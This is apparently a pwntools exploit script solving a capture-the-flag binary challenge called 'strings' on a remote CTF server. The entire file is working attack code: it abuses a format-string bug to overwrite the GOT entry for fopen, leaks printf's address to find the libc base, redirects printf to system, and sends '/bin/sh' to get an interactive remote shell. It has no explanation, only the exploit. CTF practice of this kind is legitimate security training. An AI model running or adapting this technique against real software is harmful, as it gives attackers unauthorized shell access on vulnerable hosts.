from pwn import *

context.binary = elf = ELF('./strings')
libc = ELF('./libc.so')

#io = process()
#gdb.attach(io, api=True)
io = remote('challs.n00bzunit3d.xyz', 7150)

io.recvuntil(b'? \n')
payload = fmtstr_payload(6, {elf.got['fopen']:elf.sym['main']})
io.sendline(payload)

io.recvuntil(b'? \n')
payload = b'%7$s----' + p64(0x404028)
io.sendline(payload)
libc.address = u64(io.recvuntil(b'----')[:-4].ljust(8, b'\0')) - libc.sym['printf']
log.info(f'Libc base: {hex(libc.address)}')

io.recvuntil(b'? \n')
payload = fmtstr_payload(6, {elf.got['printf']:libc.sym['system']})
io.sendline(payload)
io.sendline(b'/bin/sh')

io.interactive()